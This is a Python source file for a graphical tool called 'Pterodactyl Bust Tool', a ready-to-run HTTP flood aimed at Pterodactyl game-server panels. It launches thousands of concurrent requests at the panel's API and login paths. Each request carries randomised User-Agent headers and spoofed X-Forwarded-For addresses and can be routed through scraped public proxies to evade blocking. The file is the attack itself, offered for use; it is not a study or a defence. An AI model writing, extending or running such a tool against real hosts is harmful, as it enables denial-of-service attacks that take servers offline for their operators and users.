
import tkinter as tk
from tkinter import messagebox
import asyncio
import aiohttp
import random
import time
import threading
import requests

class PterodactylBusterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Pterodactyl Bust Tool")
        self.root.configure(bg="#330000")  # Vibrant red-black theme
        self.running = False
        self.sent = 0
        self.failed = 0
        self.proxies = []

        self.setup_gui()

    def setup_gui(self):
        font_title = ("Helvetica", 11, "bold")
        font_label = ("Courier", 10)
        label_fg = "#FF5555"
        bg_color = "#330000"

        tk.Label(self.root, text="Made by @necuix", fg=label_fg, bg=bg_color, font=font_title).pack(pady=5)

        tk.Label(self.root, text="Target IPv4/Domain:", fg=label_fg, bg=bg_color, font=font_label).pack()
        self.target_entry = tk.Entry(self.root, width=40, bg="#660000", fg="white", insertbackground="white")
        self.target_entry.pack()

        tk.Label(self.root, text="Protocol (http or https):", fg=label_fg, bg=bg_color, font=font_label).pack()
        self.protocol_entry = tk.Entry(self.root, width=15, bg="#660000", fg="white", insertbackground="white")
        self.protocol_entry.pack()

        tk.Label(self.root, text="Duration (seconds, max 240):", fg=label_fg, bg=bg_color, font=font_label).pack()
        self.duration_entry = tk.Entry(self.root, width=10, bg="#660000", fg="white", insertbackground="white")
        self.duration_entry.pack()

        tk.Label(self.root, text="Concurrency (default: 4000):", fg=label_fg, bg=bg_color, font=font_label).pack()
        self.concurrency_entry = tk.Entry(self.root, width=10, bg="#660000", fg="white", insertbackground="white")
        self.concurrency_entry.insert(0, "4000")
        self.concurrency_entry.pack()

        self.start_button = tk.Button(self.root, text="Start Test", command=self.start_attack, bg="#990000", fg="white")
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop", command=self.stop_attack, bg="#660000", fg="white")
        self.stop_button.pack(pady=5)

        self.status_label = tk.Label(self.root, text="Status: Idle", font=("Courier", 11, "bold"), fg="white", bg=bg_color)
        self.status_label.pack(pady=10)

        self.stats_label = tk.Label(self.root, text="Sent: 0 | Failed: 0", font=("Courier", 12, "bold"), fg="#FF6666", bg=bg_color)
        self.stats_label.pack()

    def fetch_proxies(self):
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000")
            proxy_list = res.text.splitlines()
            self.proxies = [p.strip() for p in proxy_list if p.strip()]
            print(f"[✓] Loaded {len(self.proxies)} proxies.")
        except Exception as e:
            print("[!] Failed to load proxies. Continuing without them.")

    def start_attack(self):
        target = self.target_entry.get().strip()
        protocol = self.protocol_entry.get().strip().lower()
        try:
            duration = int(self.duration_entry.get().strip())
        except:
            duration = 60
        try:
            concurrency = int(self.concurrency_entry.get().strip())
        except:
            concurrency = 4000

        if protocol not in ["http", "https"]:
            messagebox.showerror("Error", "Invalid protocol. Use 'http' or 'https'.")
            return
        if duration > 240:
            duration = 240
        if concurrency > 8000:
            concurrency = 8000

        self.sent = 0
        self.failed = 0
        self.running = True
        self.status_label.config(text=f"Running on {protocol}://{target} for {duration}s")
        threading.Thread(target=self.run_attack, args=(target, protocol, duration, concurrency)).start()
        self.root.after(1000, self.update_stats)

    def stop_attack(self):
        self.running = False
        self.status_label.config(text="Status: Stopped")

    def update_stats(self):
        if self.running:
            self.stats_label.config(text=f"Sent: {self.sent} | Failed: {self.failed}")
            self.root.after(1000, self.update_stats)
        else:
            self.stats_label.config(text=f"Final: Sent: {self.sent} | Failed: {self.failed}")

    def run_attack(self, target, protocol, duration, concurrency):
        asyncio.run(self.http_bust(target, protocol, duration, concurrency))

    async def http_bust(self, target, protocol, duration, concurrency):
        self.fetch_proxies()
        timeout = time.time() + duration
        paths = [
            "/api/client",
            "/auth/login",
            "/api/me",
            "/server",
            "/api/application/servers",
            "/daemon/server"
        ]
        connector = aiohttp.TCPConnector(limit=0, ssl=(protocol == "https"))
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                asyncio.create_task(self.worker(session, target, protocol, timeout, paths))
                for _ in range(concurrency)
            ]
            await asyncio.gather(*tasks)
        self.running = False
        self.status_label.config(text="Status: Completed")

    async def worker(self, session, target, protocol, timeout, paths):
        while time.time() < timeout and self.running:
            try:
                path = random.choice(paths)
                url = f"{protocol}://{target}{path}?_={random.randint(100000,999999)}"
                headers = {
                    "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,599)}.36",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Referer": f"{protocol}://{target}/auth/login"
                }

                proxy = None
                if self.proxies:
                    proxy_ip = random.choice(self.proxies)
                    proxy = f"http://{proxy_ip}"

                async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status in [200, 403, 500, 302]:
                        self.sent += 1
                    else:
                        self.failed += 1
            except Exception:
                self.failed += 1

if __name__ == "__main__":
    root = tk.Tk()
    app = PterodactylBusterGUI(root)
    root.mainloop()
